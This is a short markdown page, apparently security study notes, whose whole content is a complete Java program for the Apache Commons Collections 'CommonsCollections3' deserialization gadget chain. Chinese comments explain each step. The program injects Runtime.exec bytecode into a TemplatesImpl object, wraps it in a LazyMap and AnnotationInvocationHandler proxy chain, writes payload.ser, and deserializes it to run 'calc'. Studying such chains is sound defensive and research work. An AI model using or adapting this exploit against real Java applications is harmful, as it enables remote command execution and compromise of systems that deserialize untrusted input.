---
description: InstantiateTransformer+LazyMap
---

# CommonsCollections3

PayLoad：

```java
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import static sun.reflect.misc.FieldUtil.getField;

public class CommonsCollections3 {
    static String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues
    public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {
        //获取构造函数
        final Constructor<?> ctor = Class.forName(handler).getDeclaredConstructors()[0];
        //获取handler的私有成员的访问权限，否则会报 can not access a member of class sun.reflect.annotation.AnnotationInvocationHandler
        Permit.setAccessible(ctor);
        //实例化
        return (InvocationHandler) ctor.newInstance(Override.class, map);
    }
    //createMyproxy用于返回handler为ih，代理接口为iface的动态代理对象
    public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);
        allIfaces[0] = iface;
        return iface.cast(Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), allIfaces, ih));
    }
    // 设置成员变量值
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        try {
            //获取私有成员变量
            field = obj.getClass().getDeclaredField(fieldName);
            //获取私有成员变量访问权限
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        field.set(obj, value);
    }
    //  获取成员变量值得
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field field = null;
        try {
            field = obj.getClass().getDeclaredField(fieldName);
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        return field.get(obj);
    }
    //  7u21反序列化漏洞恶意类生成函数
    public static Object createTemplatesImpl(String command) throws Exception{
        Object templates = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").newInstance();
        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.get(CommonsCollections2.StubTransletPayload.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        final byte[] classBytes = clazz.toBytecode();
        setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes});
        // required to make TemplatesImpl happy
        setFieldValue(templates, "_name", "Pwnr");
        setFieldValue(templates, "_tfactory", Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        return templates;
    }
    public static void main(String[] args) throws Exception {
        String command = "calc";
        Object templatesImpl = createTemplatesImpl(command);
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { templatesImpl } )};
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);
        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);
        //这样的话，调用transformerChain的tranform方法就相当于调用TrAXFilter(templatesImpl)
        setFieldValue(transformerChain, "iTransformers", transformers);
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handler);
        oos.flush();
        oos.close();
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
}

```



